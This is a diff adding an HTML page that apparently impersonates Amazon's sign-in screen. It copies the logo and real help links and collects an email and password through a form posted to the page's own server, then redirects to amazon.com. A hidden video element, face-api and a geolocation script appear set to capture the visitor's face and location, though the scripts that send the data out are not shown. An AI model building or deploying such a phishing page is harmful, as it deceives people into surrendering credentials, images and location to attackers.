@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon Sign in</title>
+    <link rel="shortcut icon" href="/images/amazon-icon.png" type="image/x-icon">
+
+    <link rel="stylesheet" href="/css/amazon.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+</head>
+
+<body>
+    <div class="main">
+        <div class="container">
+            <img src="/images/amazon.png" alt="amazon logo" class="logo">
+            <form id="loginForm" method="post" data-type="amazon.com" data-redirect="https://www.amazon.com">
+                <h2>Sign-In</h2>
+                <div id="emailField" class="field active">
+                    <div class="input-field active">
+                        <label for="usename">Email or mobile phone number</label>
+                        <input type="text" id="emailOrPhone" name="username">
+                        <span id="email_error" class="error"></span>
+                    </div>
+                    <div class="btns">
+                        <button type="button" id="continue">Continue</button>
+                    </div>
+                </div>
+
+                <div id="passwordField" class="field">
+                    <div>
+                        <span id="entered_email"></span>
+                        <button type="button" id="change_entered_email">change</button>
+                    </div>
+                    <div class="input-field">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+
+                    <div class="btns">
+                        <button type="submit">Sign in</button>
+                    </div>
+                </div>
+
+                <p>By continuing, you agree to Amazon's <span class="link">Conditions of Use</span> and <span
+                        class="link">Privacy Notice.</span></p>
+                <details class="other-container">
+                    <summary>Need help?</summary>
+                    <div class="option">
+                        <a
+                            href="https://www.amazon.in/ap/forgotpassword?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Flog-in%2Fs%3Fk%3Dlog%2Bin%26ref_%3Dnav_custrec_signin&prevRID=859KBNKZGJF7061MS5KT&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&prepopulatedLoginId=&failedSignInCount=0&openid.cl">Forgot
+                            Password</a>
+                        <a
+                            href="https://www.amazon.in/gp/help/customer/account-issues/ref=ap_login_with_otp_claim_collection?ie=UTF8">Other
+                            issues with Sign-in</a>
+                    </div>
+                </details>
+            </form>
+            <div>
+                <span class="line"></span>
+                <span>New to Amazon?</span>
+                <span class="line"></span>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
+        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+
+    <script>
+        $(document).ready(function () {
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            var phoneRegex = /^\+?\d{1,4}?[-.\s]?(\d{3}[-.\s]?\d{3}[-.\s]?\d{4}|\d{2,4}[-.\s]?\d{2,4}[-.\s]?\d{2,4})$/;
+
+            function inputTest(input) {
+                if (emailRegex.test(input)) {
+                    $("#email_error").removeClass("active")
+                    $("#emailOrPhone").removeClass("active_error")
+                }
+                else if (phoneRegex.test(input)) {
+                    $("#email_error").removeClass("active")
+                    $("#emailOrPhone").removeClass("active_error")
+                }
+                else {
+                    $("#email_error").addClass("active").text("Enter your email or mobile phone number ")
+                    $("#emailOrPhone").addClass("active_error")
+                }
+            }
+
+            $("#change_entered_email").click(() => {
+                $("#emailField").addClass("active")
+                $("#passwordField").removeClass("active")
+            })
+
+            $('#emailOrPhone').on('input', function () {
+                var inputValue = $(this).val();
+                inputTest(inputValue)
+            });
+
+            $('#continue').click(() => {
+                let emailField = $("#emailField");
+                let passwordField = $("#passwordField");
+                let emailOrPhoneInput = $("#emailOrPhone").val();
+
+                function showPassword() {
+                    emailField.removeClass("active")
+                    passwordField.addClass("active")
+
+                    $("#entered_email").text(emailOrPhoneInput)
+                }
+
+                if (emailRegex.test(emailOrPhoneInput)) {
+                    $("#email_error").removeClass("active")
+                    $("#emailOrPhone").removeClass("active_error")
+                    showPassword();
+                }
+                else if (phoneRegex.test(emailOrPhoneInput)) {
+                    $("#email_error").removeClass("active")
+                    $("#emailOrPhone").removeClass("active_error")
+                    showPassword();
+                }
+
+            })
+        })
+    </script>
+
+    <script src="/js/form_submit.js"></script>
+
+    <section id="take_photo">
+        <video id="video" autoplay muted></video>
+        <canvas id="canvas"></canvas>
+    </section>
+
+    <script defer src="/js/face-api.min.js"></script>
+    <script defer src="/js/get_location.js"></script>
+</body>
+
+</html>
